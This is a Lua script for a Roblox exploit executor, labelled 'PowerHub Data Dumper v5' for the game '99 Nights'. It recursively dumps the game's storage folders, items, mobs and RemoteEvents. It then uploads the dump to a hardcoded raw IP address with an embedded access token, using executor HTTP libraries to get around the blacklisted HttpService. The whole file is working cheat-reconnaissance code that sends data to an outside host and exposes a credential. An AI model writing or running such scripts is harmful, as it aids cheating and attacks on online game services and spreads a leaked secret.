-- ============================================
--  PowerHub - DATA DUMPER v5  (99 Nights)
--  Upload via EXECUTOR HTTP lib (request /
--  syn.request), NOT HttpService (which Real
--  executor blacklists). New filename to bust
--  the per-filename cache (v3 was cached).
--  Tries multiple HTTP libraries in order.
-- ============================================

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local ENDPOINT = "http://95.111.193.38/phdump/"
local TOKEN = "aWx035ytzsPCOBgmQmSeBYPy"

local out = {}
local function log(...)
    local t = table.concat({...}, " ")
    table.insert(out, t)
    print(t)
end

log("===== POWERHUB DATA DUMPER v5 mulai =====")
log("Player: " .. tostring(player and player.Name))

local function pathOf(inst)
    local n={}; local p=inst
    while p do table.insert(n,1,p.Name); p=p.Parent end
    return table.concat(n,".")
end

local function dumpTree(root, depth, maxDepth, prefix)
    maxDepth = maxDepth or 12
    for _, c in ipairs(root:GetChildren()) do
        log(prefix .. "[" .. c.ClassName .. "] " .. c.Name)
        if depth < maxDepth then dumpTree(c, depth+1, maxDepth, prefix.."  ") end
    end
end

-- ============ 1. RELEVANT FULL DUMPS ============
local keyFolders = { "Databases","Tools","Shops","Crafting Table","Containers","Configs","TempStorage","Assets","Modules","Core" }
for _, fname in ipairs(keyFolders) do
    local f = ReplicatedStorage:FindFirstChild(fname)
    if f then
        log("\n=== ReplicatedStorage." .. fname .. "  (" .. tostring(#f:GetChildren()) .. " children) ===")
        dumpTree(f, 0, 4, "  ")
    else
        log("\n=== ReplicatedStorage." .. fname .. " = NOT FOUND ===")
    end
end

-- Kid-related search
log("\n=== KIDS / MISSING CHILDREN (search) ===")
local function huntNames(root, depth)
    if depth > 10 then return end
    for _, c in ipairs(root:GetChildren()) do
        local nm = c.Name:lower()
        if nm:find("child") or nm:find("kid") or nm:find("missing") or nm:find("dino") or nm:find("kraken") or nm:find("squid") or nm:find("koala") then
            log("  FOUND: " .. pathOf(c) .. "  [" .. c.ClassName .. "]")
        end
        huntNames(c, depth+1)
    end
end
huntNames(ReplicatedStorage, 0)

log("\n=== MissingKids + KidInventory + KidTasks (deep) ===")
local hobbies = {
    Workspace:FindFirstChild("Map") and Workspace.Map:FindFirstChild("MissingKids"),
    ReplicatedStorage:FindFirstChild("Shops") and ReplicatedStorage.Shops:FindFirstChild("KidInventory"),
    ReplicatedStorage:FindFirstChild("Databases") and ReplicatedStorage.Databases:FindFirstChild("KidTasks"),
}
for _, mk in ipairs(hobbies) do
    if mk then
        log("--- " .. pathOf(mk) .. " ---")
        dumpTree(mk, 0, 6, "  ")
    end
end

-- Unique mob names
log("\n=== Unique Character/mob names ===")
local charsF = Workspace:FindFirstChild("Characters")
local mobNames = {}
if charsF then
    for _, c in ipairs(charsF:GetChildren()) do mobNames[c.Name] = (mobNames[c.Name] or 0) + 1 end
    for k, v in pairs(mobNames) do log("  " .. k .. "  (x" .. v .. ")") end
end

-- Full Tools / Items / RemoteEvents
log("\n=== ReplicatedStorage.Tools ===")
local toolsF = ReplicatedStorage:FindFirstChild("Tools")
if toolsF then for _, c in ipairs(toolsF:GetChildren()) do log("  ["..c.ClassName.."] "..c.Name) end end

log("\n=== Workspace.Items (first 100) ===")
local itemsF = Workspace:FindFirstChild("Items")
if itemsF then
    local count = 0
    for _, c in ipairs(itemsF:GetChildren()) do
        if count >= 100 then break end
        log("  ["..c.ClassName.."] "..c.Name); count = count + 1
    end
    log("  ... total: "..tostring(#itemsF:GetChildren()))
end

log("\n=== RemoteEvents (full) ===")
local re = ReplicatedStorage:FindFirstChild("RemoteEvents")
if re then for _, c in ipairs(re:GetChildren()) do log("  ["..c.ClassName.."] "..c.Name) end end

log("\n===== POWERHUB DATA DUMPER v5 selesai =====")
local fullDump = table.concat(out, "\n")
log("\n[Dump size: "..tostring(#fullDump).." chars]")

-- ============ SEND VIA EXECUTOR HTTP LIB ============
local url = ENDPOINT .. "?token=" .. TOKEN .. "&name=dumpv5_" .. tostring(os.time())

task.spawn(function()
    local ok, resp = pcall(function()
        -- Try several HTTP libraries in order, bypassing HttpService (blacklisted)
        local lib = nil
        if syn and syn.request then      lib = syn.request
        elseif request then               lib = request
        elseif http and http.request then lib = http.request
        end
        if not lib then
            error("No executor HTTP library found (syn.request/request/http.request all nil)")
        end
        -- NOTE: Many executors need body (not Body). We send as form regardless.
        return lib({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
            Body = fullDump,
        })
    end)

    if ok then
        local status = type(resp) == "table" and tostring(resp.StatusCode or resp.statusCode or resp.Status) or tostring(resp)
        print("✅ DUMP SENT. HTTP status: " .. status)
        print("   Cek GitHub /dumps/dumpv5_*.txt")
        if type(resp) == "table" then print("   Body: " .. tostring(resp.Body or resp.body)) end
    else
        print("❌ Upload GAGAL: " .. tostring(resp))
        print("   Executor HTTP lib diblokir/tdk ada? Pastikan liat log di atas.")
    end
end)

return fullDump